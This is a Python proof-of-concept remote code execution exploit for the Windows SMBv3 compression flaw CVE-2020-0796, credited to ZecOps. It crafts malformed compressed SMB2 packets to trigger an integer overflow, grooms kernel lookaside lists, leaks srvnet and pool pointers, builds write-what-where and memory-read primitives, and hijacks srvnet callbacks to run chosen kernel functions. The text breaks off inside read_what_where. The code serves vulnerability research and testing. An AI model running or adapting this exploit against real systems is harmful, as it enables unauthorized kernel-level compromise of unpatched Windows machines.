# CVE-2020-0796 Remote Code Execution POC
# (c) 2020 ZecOps, Inc. - https://www.zecops.com - Find Attackers' Mistakes
# Intended only for educational and testing in corporate environments.
# ZecOps takes no responsibility for the code, use at your own risk.

import socket, struct, sys
import os, ctypes, threading

OFFSETS = {
    'srvnet!SrvNetWskConnDispatch': 0x2D170,
    'srvnet!imp_IoSizeofWorkItem': 0x32210,
    'srvnet!imp_RtlCopyUnicodeString': 0x32288,
    'nt!IoSizeofWorkItem': 0x12C410,
    'nt!MiGetPteAddress': 0xBA968
}

# The number of iterations for some of the operations, as part of an attempt to
# support targets with multiple logical processors.
# A larger value can make the POC more reliable, but also slower.
LOOKASIDE_RELATED_ITERATIONS = 4

class Smb2Header:
    def __init__(self, command, message_id=0, session_id=0):
        self.protocol_id = b"\xfeSMB"
        self.structure_size = b"\x40\x00"  # Must be set to 0x40
        self.credit_charge = b"\x00"*2
        self.channel_sequence = b"\x00"*2
        self.channel_reserved = b"\x00"*2
        self.command = struct.pack('<H', command)
        self.credits_requested = b"\x00"*2  # Number of credits requested / granted
        self.flags = b"\x00"*4
        self.chain_offset = b"\x00"*4  # Points to next message
        self.message_id = struct.pack('<Q', message_id)
        self.reserved = b"\x00"*4
        self.tree_id = b"\x00"*4  # Changes for some commands
        self.session_id = struct.pack('<Q', session_id)
        self.signature = b"\x00"*16

    def get_packet(self):
        return self.protocol_id + self.structure_size + self.credit_charge + self.channel_sequence + self.channel_reserved + self.command + self.credits_requested + self.flags + self.chain_offset + self.message_id + self.reserved + self.tree_id + self.session_id + self.signature

class Smb2NegotiateRequest:
    def __init__(self):
        self.header = Smb2Header(0)
        self.structure_size = b"\x24\x00"
        self.dialect_count = b"\x08\x00"  # 8 dialects
        self.security_mode = b"\x00"*2
        self.reserved = b"\x00"*2
        self.capabilities = b"\x7f\x00\x00\x00"
        self.guid = b"\x01\x02\xab\xcd"*4
        self.negotiate_context = b"\x78\x00"
        self.additional_padding = b"\x00"*2
        self.negotiate_context_count = b"\x02\x00"  # 2 Contexts
        self.reserved_2 = b"\x00"*2
        self.dialects = b"\x02\x02" + b"\x10\x02" + b"\x22\x02" + b"\x24\x02" + b"\x00\x03" + b"\x02\x03" + b"\x10\x03" + b"\x11\x03"  # SMB 2.0.2, 2.1, 2.2.2, 2.2.3, 3.0, 3.0.2, 3.1.0, 3.1.1
        self.padding = b"\x00"*4

    def context(self, type, length):
        data_length = length
        reserved = b"\x00"*4
        return type + data_length + reserved

    def preauth_context(self):
        hash_algorithm_count = b"\x01\x00"  # 1 hash algorithm
        salt_length = b"\x20\x00"
        hash_algorithm = b"\x01\x00"  # SHA512
        salt = b"\x00"*32
        pad = b"\x00"*2
        length = b"\x26\x00"
        context_header = self.context(b"\x01\x00", length)
        return context_header + hash_algorithm_count + salt_length + hash_algorithm + salt + pad

    def compression_context(self):
        #compression_algorithm_count = b"\x03\x00"  # 3 Compression algorithms
        compression_algorithm_count = b"\x01\x00"
        padding = b"\x00"*2
        flags = b"\x01\x00\x00\x00"
        #algorithms = b"\x01\x00" + b"\x02\x00" + b"\x03\x00"  # LZNT1 + LZ77 + LZ77+Huffman
        algorithms = b"\x01\x00"
        #length = b"\x0e\x00"
        length = b"\x0a\x00"
        context_header = self.context(b"\x03\x00", length)
        return context_header + compression_algorithm_count + padding + flags + algorithms

    def get_packet(self):
        padding = b"\x00"*8
        return self.header.get_packet() + self.structure_size + self.dialect_count + self.security_mode + self.reserved + self.capabilities + self.guid + self.negotiate_context + self.additional_padding + self.negotiate_context_count + self.reserved_2 + self.dialects + self.padding + self.preauth_context() + self.compression_context() + padding

class NetBIOSWrapper:
    def __init__(self, data):
        self.session = b"\x00"
        self.length = struct.pack('>i', len(data))[1:]
        self.data = data

    def get_packet(self):
        return self.session + self.length + self.data

class Smb2CompressedTransformHeader:
    def __init__(self, data, offset, original_decompressed_size):
        self.data = data
        self.protocol_id = b"\xfcSMB"
        self.original_decompressed_size = struct.pack('<i', original_decompressed_size)
        self.compression_algorithm = b"\x01\x00"
        self.flags = b"\x00"*2
        self.offset = struct.pack('<i', offset)

    def get_packet(self):
        return self.protocol_id + self.original_decompressed_size + self.compression_algorithm + self.flags + self.offset + self.data

class Smb2SessionSetupRequest:
    def __init__(self, message_id, buffer, session_id=0, padding=b''):
        self.header = Smb2Header(1, message_id, session_id)
        self.structure_size = b"\x19\x00"
        self.flags = b"\x00"
        self.security_mode = b"\x02"
        self.capabilities = b"\x00"*4
        self.channel = b"\x00"*4
        self.security_buffer_offset = struct.pack('<H', 0x58 + len(padding))
        self.security_buffer_length = struct.pack('<H', len(buffer))
        self.previous_session_id = b"\x00\x00\x00\x00\x00\x00\x00\x00"
        self.padding = padding
        self.buffer = buffer

    def get_packet(self):
        return (self.header.get_packet() +
            self.structure_size +
            self.flags +
            self.security_mode +
            self.capabilities +
            self.channel +
            self.security_buffer_offset +
            self.security_buffer_length +
            self.previous_session_id +
            self.padding +
            self.buffer)

class Smb2NtlmNegotiate:
    def __init__(self):
        self.signature = b"NTLMSSP\x00"
        self.message_type = b"\x01\x00\x00\x00"
        self.negotiate_flags = b"\x32\x90\x88\xe2"
        self.domain_name_len = b"\x00\x00"
        self.domain_name_max_len = b"\x00\x00"
        self.domain_name_buffer_offset = b"\x28\x00\x00\x00"
        self.workstation_len = b"\x00\x00"
        self.workstation_max_len = b"\x00\x00"
        self.workstation_buffer_offset = b"\x28\x00\x00\x00"
        self.version = b"\x06\x01\xb1\x1d\x00\x00\x00\x0f"
        self.payload_domain_name = b""
        self.payload_workstation = b""

    def get_packet(self):
        return (self.signature +
            self.message_type +
            self.negotiate_flags +
            self.domain_name_len +
            self.domain_name_max_len +
            self.domain_name_buffer_offset +
            self.workstation_len +
            self.workstation_max_len +
            self.workstation_buffer_offset +
            self.version +
            self.payload_domain_name +
            self.payload_workstation)

class Smb2NtlmAuthenticate:
    def __init__(self, timestamp, computer_name=b'', no_nt_challenge_trailing_reserved=False, padding=b''):
        self.signature = b"NTLMSSP\x00"
        self.message_type = b"\x03\x00\x00\x00"
        self.lm_challenge_response_len = b"\x00"*2
        self.lm_challenge_response_max_len = b"\x00"*2
        self.lm_challenge_response_buffer_offset = b"\x00"*4
        self.nt_challenge_response_len = b"\x00"*2  # will calculate later
        self.nt_challenge_response_max_len = b"\x00"*2  # will calculate later
        self.nt_challenge_response_buffer_offset = struct.pack('<I', 0x58 + len(padding))
        self.domain_name_len = b"\x00"*2
        self.domain_name_max_len = b"\x00"*2
        self.domain_name_buffer_offset = b"\x00"*4
        self.user_name_len = b"\x00"*2
        self.user_name_max_len = b"\x00"*2
        self.user_name_buffer_offset = b"\x00"*4
        self.workstation_len = b"\x00"*2
        self.workstation_max_len = b"\x00"*2
        self.workstation_buffer_offset = b"\x00"*4
        self.encrypted_random_session_key_len = b"\x01\x00"
        self.encrypted_random_session_key_max_len = b"\x01\x00"
        self.encrypted_random_session_key_buffer_offset = b"\x00"*4  # don't care where
        self.negotiate_flags = b"\x36\x82\x8a\xe2"
        self.version = b"\x00"*8
        self.mic = b"\x00"*16
        self.timestamp = timestamp
        self.computer_name = computer_name
        self.no_nt_challenge_trailing_reserved = no_nt_challenge_trailing_reserved
        self.padding = padding

    def nt_challenge_response(self):
        nt_proof_str = b"\x00"*16
        resp_type = b"\x01"
        hi_resp_type = b"\x01"
        reserved1 = b"\x00"*2
        reserved2 = b"\x00"*4
        timestamp_but_not_the_important_one = b"\x00"*8
        client_challenge = b"\x00"*8
        reserved3 = b"\x00"*4
        ntlmv2_client_challenge_timestamp = b"\x07\x00\x08\x00" + self.timestamp
        ntlmv2_client_challenge_domain_name = b"\x02\x00\x00\x00"
        ntlmv2_client_challenge_computer_name = b"\x01\x00" + struct.pack('<H', len(self.computer_name)) + self.computer_name
        ntlmv2_client_challenge_last = b"\x00"*4
        reserved4 = b"\x00"*4 if not self.no_nt_challenge_trailing_reserved else b""
        return (nt_proof_str +
            resp_type +
            hi_resp_type +
            reserved1 +
            reserved2 +
            timestamp_but_not_the_important_one +
            client_challenge +
            reserved3 +
            ntlmv2_client_challenge_timestamp +
            ntlmv2_client_challenge_domain_name +
            ntlmv2_client_challenge_computer_name +
            ntlmv2_client_challenge_last +
            reserved4)

    def get_packet(self):
        nt_challenge_response = self.nt_challenge_response()
        self.nt_challenge_response_len = struct.pack('<H', len(nt_challenge_response))
        self.nt_challenge_response_max_len = struct.pack('<H', len(nt_challenge_response))
        return (self.signature +
            self.message_type +
            self.lm_challenge_response_len +
            self.lm_challenge_response_max_len +
            self.lm_challenge_response_buffer_offset +
            self.nt_challenge_response_len +
            self.nt_challenge_response_max_len +
            self.nt_challenge_response_buffer_offset +
            self.domain_name_len +
            self.domain_name_max_len +
            self.domain_name_buffer_offset +
            self.user_name_len +
            self.user_name_max_len +
            self.user_name_buffer_offset +
            self.workstation_len +
            self.workstation_max_len +
            self.workstation_buffer_offset +
            self.encrypted_random_session_key_len +
            self.encrypted_random_session_key_max_len +
            self.encrypted_random_session_key_buffer_offset +
            self.negotiate_flags +
            self.version +
            self.mic +
            self.padding +
            nt_challenge_response)

# Source:
# https://github.com/0vercl0k/CVE-2019-11708/blob/0e4e3d437bc7b589b595411a6c79b2e54344da2b/payload/src/genheaders.py#L49
def compress(buffer_in):
    '''Compress a buffer with a specific format.'''
    COMPRESSION_FORMAT_LZNT1 = 2
    COMPRESSION_FORMAT_XPRESS = 3  # added in Windows 8
    COMPRESSION_FORMAT_XPRESS_HUFF = 4  # added in Windows 8
    COMPRESSION_ENGINE_STANDARD = 0
    COMPRESSION_ENGINE_MAXIMUM = 256
    RtlCompressBuffer = ctypes.windll.ntdll.RtlCompressBuffer
    RtlGetCompressionWorkSpaceSize = ctypes.windll.ntdll.RtlGetCompressionWorkSpaceSize

    fmt_engine = COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_STANDARD
    workspace_size = ctypes.c_ulong(0)
    workspace_fragment_size = ctypes.c_ulong(0)
    res = RtlGetCompressionWorkSpaceSize(
        ctypes.c_ushort(fmt_engine),
        ctypes.pointer(workspace_size),
        ctypes.pointer(workspace_fragment_size)
    )

    assert res == 0, 'RtlGetCompressionWorkSpaceSize failed.'

    workspace = ctypes.c_buffer(workspace_size.value)
    buffer_out = ctypes.c_buffer(1024 + len(buffer_in) + len(buffer_in) // 10)
    compressed_size = ctypes.c_ulong(0)
    res = RtlCompressBuffer(
        ctypes.c_ushort(fmt_engine),
        buffer_in,
        len(buffer_in),
        buffer_out,
        len(buffer_out),
        ctypes.c_ulong(4096),
        ctypes.pointer(compressed_size),
        workspace
    )

    assert res == 0, 'RtlCompressBuffer failed.'
    return buffer_out.raw[: compressed_size.value]

def decompress(buffer_in, decompressed_size):
    '''Compress a buffer with a specific format.'''
    COMPRESSION_FORMAT_LZNT1 = 2
    COMPRESSION_FORMAT_XPRESS = 3  # added in Windows 8
    COMPRESSION_FORMAT_XPRESS_HUFF = 4  # added in Windows 8
    RtlDecompressBufferEx = ctypes.windll.ntdll.RtlDecompressBufferEx
    RtlGetCompressionWorkSpaceSize = ctypes.windll.ntdll.RtlGetCompressionWorkSpaceSize

    fmt_engine = COMPRESSION_FORMAT_LZNT1
    workspace_size = ctypes.c_ulong(0)
    workspace_fragment_size = ctypes.c_ulong(0)
    res = RtlGetCompressionWorkSpaceSize(
        ctypes.c_ushort(fmt_engine),
        ctypes.pointer(workspace_size),
        ctypes.pointer(workspace_fragment_size)
    )

    assert res == 0, 'RtlGetCompressionWorkSpaceSize failed.'

    workspace = ctypes.c_buffer(workspace_size.value)
    buffer_out = ctypes.c_buffer(decompressed_size)
    final_decompressed_size = ctypes.c_ulong(0)
    res = RtlDecompressBufferEx(
        ctypes.c_ushort(fmt_engine),
        buffer_out,
        len(buffer_out),
        buffer_in,
        len(buffer_in),
        ctypes.pointer(final_decompressed_size),
        workspace
    )

    assert res == 0, 'RtlDecompressBufferEx failed.'
    return buffer_out.raw[: final_decompressed_size.value]

def send_negotiation(sock):
    negotiate = Smb2NegotiateRequest().get_packet()
    packet = NetBIOSWrapper(negotiate).get_packet()
    sock.send(packet)
    reply_size = sock.recv(4)
    return sock.recv(struct.unpack('>I', reply_size)[0])

def send_compressed(sock, data, offset, original_decompressed_size):
    compressed = Smb2CompressedTransformHeader(data, offset, original_decompressed_size).get_packet()
    packet = NetBIOSWrapper(compressed).get_packet()
    sock.send(packet)
    reply_size = sock.recv(4)
    return sock.recv(struct.unpack('>I', reply_size)[0])

def send_session_setup_with_ntlm_negotiate(sock):
    ntlm_negotiate = Smb2NtlmNegotiate().get_packet()
    session_setup = Smb2SessionSetupRequest(1, ntlm_negotiate).get_packet()
    return send_compressed(sock, compress(session_setup), 0, len(session_setup))

def send_session_setup_with_ntlm_authenticate(sock, session_id, timestamp):
    ntlm_negotiate = Smb2NtlmAuthenticate(timestamp).get_packet()
    session_setup = Smb2SessionSetupRequest(2, ntlm_negotiate, session_id).get_packet()
    return send_compressed(sock, compress(session_setup), 0, len(session_setup))

def connect_and_send_compressed(ip_address, data, offset, original_decompressed_size):
    with socket.socket(socket.AF_INET) as sock:
        sock.settimeout(30)
        sock.connect((ip_address, 445))
        send_negotiation(sock)

        try:
            return send_compressed(sock, data, offset, original_decompressed_size)
        except ConnectionResetError:
            return None  # usually expected, just return

def is_target_vulnerable(ip_address):
    ntlm_negotiate = Smb2NtlmNegotiate().get_packet()
    session_setup = Smb2SessionSetupRequest(1, ntlm_negotiate).get_packet()

    # Trigger an integer overflow. A patched system will discard the packet.
    return connect_and_send_compressed(ip_address, session_setup + b'\x00'*16, len(session_setup), -1) != None

def connect_and_send_compressed_multiple_times(ip_address, data, offset, original_decompressed_size):
    for _ in range(LOOKASIDE_RELATED_ITERATIONS):
        connect_and_send_compressed(ip_address, data, offset, original_decompressed_size)

def connect_and_send_compressed_multiple_times_multithreaded(ip_address, data, offset, original_decompressed_size):
    # Send several requests simultaneously to increase the chance of the packets
    # to be handled on different logical processors on the target computer.
    def thread_func():
        connect_and_send_compressed(ip_address, b'A'*0x200, 0, 0x200)

    for _ in range(LOOKASIDE_RELATED_ITERATIONS):
        threads = []
        for _ in range(LOOKASIDE_RELATED_ITERATIONS):
            t = threading.Thread(target=thread_func)
            threads.append(t)
            t.start()

        for _ in range(LOOKASIDE_RELATED_ITERATIONS):
            connect_and_send_compressed(ip_address, data, offset, original_decompressed_size)

        for t in threads:
            t.join()

def leak_if_ptr_byte_larger_than_value(ip_address, byte_offset, ptr_list, compare_to_byte):
    # Write a zero byte next to the byte we want to leak.
    # The payload is crafted so that the decompression will fail after
    # writing the part we need, allowing to write in the middle of the
    # allocated block.
    count1 = compare_to_byte + 3
    count2 = 0xFF + 3 - count1
    payload = b'\xb0' + b'\x00'*count1 + b'\xff'*count2

    offset = byte_offset - 0x50 + 1
    original_decompressed_size = ptr_list - offset  # will be decompressed to target-sized lookaside list
    data = b'B'*offset + compress(payload)
    data += b'\xff'*(0x4101 - len(data))  # request will go to 0x8100-sized lookaside list
    connect_and_send_compressed_multiple_times(ip_address, data, offset, original_decompressed_size)

    ntlm_negotiate = Smb2NtlmNegotiate().get_packet()
    session_setup = Smb2SessionSetupRequest(1, ntlm_negotiate).get_packet()

    prev_ptr_list = (ptr_list - 0x100) // 2 + 0x100

    data = session_setup
    data += b'B'*(prev_ptr_list + 1 - 0x10 - len(data))  # request will go to target-sized lookaside list
    offset = byte_offset - 0x60
    original_decompressed_size = 0x4101 - offset  # will be decompressed to 0x8100-sized lookaside list

    reply = connect_and_send_compressed(ip_address, data, offset, original_decompressed_size)
    send_count = 1

    while reply != None and send_count < LOOKASIDE_RELATED_ITERATIONS:
        # This reply is unreliable, might be a zero byte from a lookaside list
        # of a different processor. Try again to verify.
        reply = connect_and_send_compressed(ip_address, data, offset, original_decompressed_size)
        send_count += 1

    #print(f'result {reply == None}, send_count {send_count}')

    return reply == None

def leak_ptr_byte(ip_address, byte_offset, ptr_list):
    attempts = 0
    while True:
        if attempts >= 3:
            return None  # something is wrong, give up

        attempts += 1

        # Bisecting the range.
        low = 0x00
        high = 0xFF
        while low < high:
            mid = (low + high) // 2
            if leak_if_ptr_byte_larger_than_value(ip_address, byte_offset, ptr_list, mid):
                low = mid + 1
                #print(f'>{hex(mid)} ', end='', flush=True)
            else:
                high = mid
                #print(f'<={hex(mid)} ', end='', flush=True)
            print('.', end='', flush=True)

        # Make sure we got it right
        if leak_if_ptr_byte_larger_than_value(ip_address, byte_offset, ptr_list, low):
            print(' ... ', end='', flush=True)
            continue  # something is wrong, try again

        if low > 0 and not leak_if_ptr_byte_larger_than_value(ip_address, byte_offset, ptr_list, low - 1):
            print(' ... ', end='', flush=True)
            continue  # something is wrong, try again

        break  # let's hope we got it right...

    #print(f'={hex(low)}')
    return low

def leak_ptr(ip_address, ptr_offset, ptr_list):
    byte_values = []
    for byte_index in reversed(range(0, 6)):
        #print(f'Leaking byte {byte_index}')
        byte_value = leak_ptr_byte(ip_address, ptr_offset + byte_index, ptr_list)
        if byte_value == None:
            return None

        byte_values.insert(0, byte_value)

    address = bytes(byte_values) + b'\xff\xff'
    address = struct.unpack('<Q', address)[0]

    # This happens sometimes if the lookaside lists don't behave nicely.
    if address == 0xFFFF000000000000:
        return None

    print()
    #print(f'Leaked address: {hex(address)}')
    return address

def prepare_allocation_pool_ptr_to_leak(ip_address):
    # Fill the lookaside allocations with 0x00 values. There's a lookaside list
    # per processor, and since we're going to have the data in only one of them,
    # make the rest hold known data.
    data = b'\x00'*0x2200  # request will go to 0x4100-sized lookaside list
    offset = 0
    original_decompressed_size = 0x10  # will be decompressed to 0x1100-sized lookaside list
    connect_and_send_compressed_multiple_times_multithreaded(ip_address, data, offset, original_decompressed_size)

    # Make so that a 0x2100-sized lookaside allocation will hold
    # the pointer we'll leak.
    # Note: We make it so that compressed data will land on zero bytes
    # so that decompression won't fail.
    data = b'A'*0x1101  # request will go to 0x2100-sized lookaside list
    offset = -0x10 + 0x2100 + 0x26  # will be decompressed to 0x4100-sized lookaside list
    original_decompressed_size = 0
    connect_and_send_compressed(ip_address, data, offset, original_decompressed_size)

    ptr_offset = 0x50 + 0x2100 + 0x18 - 0x10  # absolute offset in the allocated block

    return ptr_offset, 0x4100

def leak_allocation_pool_object_ptr(ip_address):
    while True:
        ptr_offset, ptr_list = prepare_allocation_pool_ptr_to_leak(ip_address)
        address = leak_ptr(ip_address, ptr_offset, ptr_list)
        if address != None and (address & 0xFFF) == 0x050:
            return address - 0x50

        print('\nLeak failed, retrying')

def prepare_internet_connection_ptr_to_leak(ip_address):
    # Fill the lookaside allocations with 0x00 values. There's a lookaside list
    # per processor, and since we're going to have the data in only one of them,
    # make the rest hold known data.
    data = b'\x00'*0x1200  # request will go to 0x2100-sized lookaside list
    offset = 0
    original_decompressed_size = 0x10  # will be decompressed to 0x1100-sized lookaside list
    connect_and_send_compressed_multiple_times_multithreaded(ip_address, data, offset, original_decompressed_size)

    # Copy the pointer to a 0x2100-sized lookaside list allocation in 2 steps.
    # The compressed data is chosen so that the pointer will be placed in a
    # convenient location in the target buffer. Placing it it an offset which
    # is too low is problematic since we won't be able to use the buffer without
    # overriding the pointer in this case.
    # Step 1: Prepare the source by writing compressed data that will be used soon.
    data = b'\x10\xb0@ABCDEF\x1bPX\x00123456'  # 0x2B compressed bytes
    data = data[:-6]  # last 6 bytes will copy the pointer
    offset = 0x1100 - 0x10 - len(data)
    data = b'A'*offset + data  # request will go to 0x1100-sized lookaside list
    original_decompressed_size = 0x2B  # will be decompressed to 0x2100-sized lookaside list
    connect_and_send_compressed_multiple_times_multithreaded(ip_address, data, offset, original_decompressed_size)

    # Step 2: Actually copy the pointer now that we fool the victim as if the
    # compressed source data is large.
    data = b'A'*0x200  # request will go to 0x1100-sized lookaside list
    connect_and_send_compressed(ip_address, data, offset, original_decompressed_size)

    ptr_offset = 0x50 + 0x1100 + 0x08  # absolute offset in the allocated block

    # Switch buffers.
    connect_and_send_compressed(ip_address, b'A'*0x200, 0, 0x200)

    # Create a connection, and keep it alive to keep the relevant internet
    # connection object pointer hanging around until we leak it.
    sock = socket.socket(socket.AF_INET)
    sock.settimeout(30)
    sock.connect((ip_address, 445))
    send_negotiation(sock)

    # Send a valid session setup packet, so that the connection won't be dropped.
    ntlm_negotiate = Smb2NtlmNegotiate().get_packet()
    session_setup = Smb2SessionSetupRequest(1, ntlm_negotiate).get_packet()
    data = session_setup
    data += b'A'*(0x200 - len(data))  # request will go to 0x1100-sized lookaside list
    offset = 0x1100  # will be decompressed to 0x1100-sized lookaside list
    original_decompressed_size = 0
    send_compressed(sock, data, offset, original_decompressed_size)

    return ptr_offset, 0x2100, sock

def leak_internet_connection_object_ptr(ip_address):
    while True:
        ptr_offset, ptr_list, sock_to_keep_alive = prepare_internet_connection_ptr_to_leak(ip_address)
        address = leak_ptr(ip_address, ptr_offset, ptr_list)
        if address != None and (address & 0x0F) == 0x08:
            socks_to_keep_alive.append(sock_to_keep_alive)  # add to global list
            return address, sock_to_keep_alive

        sock_to_keep_alive.close()
        print('\nLeak failed, retrying')

def write_what_where(ip_address, what, where):
    # 0x1100 bytes minus the data to write.
    # Send random bytes for bad compression.
    # Minimum payload size must be 16 bytes, otherwise packet is dropped.
    data_to_compress = os.urandom(0x1100 - len(what))
    # 0x18 null bytes that override the struct.
    data_to_compress += b'\x00'*0x18
    # Target address.
    data_to_compress += struct.pack('<Q', where)

    data = what + compress(data_to_compress)
    offset = len(what)
    return connect_and_send_compressed(ip_address, data, offset, -1)

def leak_ptr_with_mdl_ptrs(ip_address, allocation_pool_object_ptr, ptr_address):
    # We're going to override the MDL struct pointers, and use it as a reading
    # facility. As an undesired side effect, the destination memory will be
    # modified a little.
    #
    # Field                           | Type            | Modification | Effect
    # --------------------------------+-----------------+--------------+-------
    # +0x00 Next                      | Ptr64 _MDL      | = 0          | write
    # +0x08 Size                      | Int2B           |              |
    # +0x0a MdlFlags                  | Int2B           | |= 0x1000    |
    # +0x0c AllocationProcessorNumber | Uint2B          |              |
    # +0x0e Reserved                  | Uint2B          |              |
    # +0x10 Process                   | Ptr64 _EPROCESS |              |
    # +0x18 MappedSystemVa            | Ptr64 Void      | += 0x50      | read
    # +0x20 StartVa                   | Ptr64 Void      |              | write
    # +0x28 ByteCount                 | Uint4B          | -= 0x50      | r+w
    # +0x2c ByteOffset                | Uint4B          | += 0x50      | write
    #
    # Visualization of modifications, reads and writes:
    # MODIFICATIONS ON SOURCE            READS FROM SOURCE                  WRITES TO DESTINATION
    # +00 |  00 00 00 00 00 00 00 00     +00 |  __ __ __ __ __ __ __ __     +00 |  00 00 00 00 00 00 00 00
    # +08 |  __ __ __|10 __ __ __ __     +08 |  __ __ __ __ __ __ __ __     +08 |  ?? ?? 04 00 __ __ __ __
    # +10 |  __ __ __ __ __ __ __ __     +10 |  __ __ __ __ __ __ __ __     +10 |  __ __ __ __ __ __ __ __
    # +18 |  [+50..................]     +18 |  ab cd ef gh ij kl mn op     +18 |  __ __ __ __ __ __ __ __
    # +20 |  __ __ __ __ __ __ __ __     +20 |  __ __ __ __ __ __ __ __     +20 |  00 c0 ef gh ij kl mn op
    # +28 |  [-50......] [+50......]     +28 |  qr st uv wx __ __ __ __     +28 |  qr st uv wx ab 0d 00 00

    write_destination_offset = 0x50 + 0x1200

    # Fill the 0x2100-sized lookaside list allocation with zero bytes,
    # since a flag is going to be read from it, and it's better be zero.
    # Also, for reading the data after it's written.
    connect_and_send_compressed_multiple_times_multithreaded(ip_address, b'\x00'*0x2000, 0, 0x100)

    mdl1_ptr = ptr_address - 0x18  # will be used for reading, align with MappedSystemVa
    mdl2_ptr = allocation_pool_object_ptr + write_destination_offset  # results will be written here

    # Replace MDL pointers.
    offset = 0x10100 + 0x38
    data = compress(struct.pack('<QQQQ', mdl1_ptr, 0, 0, mdl2_ptr))
    data = b'A'*offset + data + b'\xff'*0x10  # request will go to 0x20100-sized lookaside list
    original_decompressed_size = 0x10100 - offset  # will be decompressed to 0x10100-sized lookaside list
    connect_and_send_compressed_multiple_times_multithreaded(ip_address, data, offset, original_decompressed_size)

    # Set flags to 3 for the code copying code to execute.
    offset = 0x10100 + 0x10
    data = compress(struct.pack('<H', 3))
    data = b'A'*offset + data + b'\xff'*0x10  # request will go to 0x20100-sized lookaside list
    original_decompressed_size = 0x10100 - offset  # will be decompressed to 0x10100-sized lookaside list
    connect_and_send_compressed(ip_address, data, offset, original_decompressed_size)

    # Reset flags to zero to free the block cleanly.
    offset = 0x10100 + 0x10 - 0x50
    data = b'\x02\xb0\x00\x00\x00'  # compress(b'\x00'*2) fails for some reason
    data = b'A'*offset + data + b'\xff'*0x60  # request will go to 0x20100-sized lookaside list
    original_decompressed_size = 0x10100 - offset  # will be decompressed to 0x10100-sized lookaside list
    connect_and_send_compressed_multiple_times_multithreaded(ip_address, data, offset, original_decompressed_size)

    byte2low = leak_ptr_byte(ip_address, write_destination_offset + 0x2D, 0x2100)
    if byte2low == None:
        return None
    byte1 = leak_ptr_byte(ip_address, write_destination_offset + 0x2C, 0x2100)
    if byte1 == None:
        return None
    byte6 = leak_ptr_byte(ip_address, write_destination_offset + 0x25, 0x2100)
    if byte6 == None:
        return None
    byte5 = leak_ptr_byte(ip_address, write_destination_offset + 0x24, 0x2100)
    if byte5 == None:
        return None
    byte4 = leak_ptr_byte(ip_address, write_destination_offset + 0x23, 0x2100)
    if byte4 == None:
        return None
    byte3 = leak_ptr_byte(ip_address, write_destination_offset + 0x22, 0x2100)
    if byte3 == None:
        return None
    byte2high = leak_ptr_byte(ip_address, write_destination_offset + 0x21, 0x2100)
    if byte2high == None:
        return None

    byte2 = byte2high | byte2low
    address = bytes([byte1, byte2, byte3, byte4, byte5, byte6, 0xFF, 0xFF])
    address = struct.unpack('<Q', address)[0]

    # This happens sometimes if the lookaside lists don't behave nicely.
    if address == 0xFFFF000000000000:
        return None

    print()
    return address - 0x50

def leak_srvnet_base_ptr(ip_address, allocation_pool_object_ptr):
    while True:
        internet_connection_object_ptr, _ = leak_internet_connection_object_ptr(ip_address)
        print(f'Leaked internet connection object address: {hex(internet_connection_object_ptr)}')

        address1 = leak_ptr_with_mdl_ptrs(ip_address, allocation_pool_object_ptr, internet_connection_object_ptr - 0x58 + 0x100)
        if address1 != None:
            address2 = leak_ptr_with_mdl_ptrs(ip_address, allocation_pool_object_ptr, address1 + 0x30)
            if address2 != None:
                base_address = address2 - OFFSETS['srvnet!SrvNetWskConnDispatch']
                if (base_address & 0xFFF) == 0x000:
                    break

        print('\nLeak failed, retrying')

    return base_address

def call_function(ip_address, callback_ptr_address, arg1=None, arg2=None):
    internet_connection_object_ptr, internet_connection_sock = leak_internet_connection_object_ptr(ip_address)
    print(f'Leaked internet connection object address: {hex(internet_connection_object_ptr)}')

    # Srvnet uses an array of five callbacks:
    # ConnectHandler, ReceiveHandler, DisconnectHandler, DereferenceInstance2, UpdateNetnameTable.
    # We'll override the array and trigger the ReceiveHandler callback, so that
    # the second function in our array will be called instead.
    write_what_where(ip_address, struct.pack('<Q', callback_ptr_address - 0x08), internet_connection_object_ptr - 0x58 + 0x118)

    # We can also control first two arguments.
    if arg1 != None:
        write_what_where(ip_address, struct.pack('<Q', arg1), internet_connection_object_ptr - 0x58 + 0x128)

    if arg2 != None:
        write_what_where(ip_address, struct.pack('<Q', arg2), internet_connection_object_ptr - 0x58 + 0x130)

    # Trigger the callback.
    session_id = 1234
    timestamp = b't1m3$t4m'
    #send_session_setup_with_ntlm_authenticate(internet_connection_sock, session_id, timestamp)

    # Instead of using the above (commented) function, send the packet manually.
    # Due to the stuff we do, the function hangs on recv, so we avoid calling it here.
    ntlm_negotiate = Smb2NtlmAuthenticate(timestamp).get_packet()
    session_setup = Smb2SessionSetupRequest(2, ntlm_negotiate, session_id).get_packet()
    compressed = Smb2CompressedTransformHeader(session_setup, 0, len(session_setup)).get_packet()
    packet = NetBIOSWrapper(compressed).get_packet()
    internet_connection_sock.send(packet)

def read_what_where_once(ip_address, srvnet_base_ptr, allocation_pool_object_ptr, size, where):
    data_offset = 0x50 + 0x1600

    # Fill the lookaside allocations with 0x00 values. There's a lookaside list
    # per processor, and since we're going to have the data in only one of them,
    # make the rest hold known data.
    data = b'\x00'*(0x2100 - 0x10)  # request will go to 0x2100-sized lookaside list
    offset = 0
    original_decompressed_size = 0x10  # will be decompressed to 0x1100-sized lookaside list
    connect_and_send_compressed_multiple_times_multithreaded(ip_address, data, offset, original_decompressed_size)

    # Build and write the unicode strings.
    sentinel = os.urandom(2)  # 16 bits for verification
    data = struct.pack('<HHIQ', size, size, 0, allocation_pool_object_ptr + data_offset + 0x20 + len(sentinel))  # dest unicode string
    data += struct.pack('<HHIQ', size, size, 0, where)  # src unicode string
    data += sentinel
    write_what_where(ip_address, data, allocation_pool_object_ptr + data_offset)
    write_what_where(ip_address, sentinel, allocation_pool_object_ptr + data_offset + 0x20 + len(sentinel) + size)

    # Call RtlCopyUnicodeString to copy the data.
    callback_ptr_address = srvnet_base_ptr + OFFSETS['srvnet!imp_RtlCopyUnicodeString']
    str_dest = allocation_pool_object_ptr + data_offset
    str_src = allocation_pool_object_ptr + data_offset + 0x10
    call_function(ip_address, callback_ptr_address, str_dest, str_src)

    # Leak the copied data.
    byte_values = []
    for byte_index in reversed(range(0, len(sentinel)*2 + size)):
        byte_value = leak_ptr_byte(ip_address, data_offset + 0x20 + byte_index, 0x2100)
        if byte_value == None:
            return None

        byte_values.insert(0, byte_value)

    result = bytes(byte_values)

    # Verify that what we read makes sense.
    if result[:len(sentinel)] != sentinel or result[-len(sentinel):] != sentinel:
        return None

    print()
    return result[len(sentinel):-len(sentinel)]

def read_what_where(ip_address, srvnet_base_ptr, allocation_pool_object_ptr, size, where):
    while True:
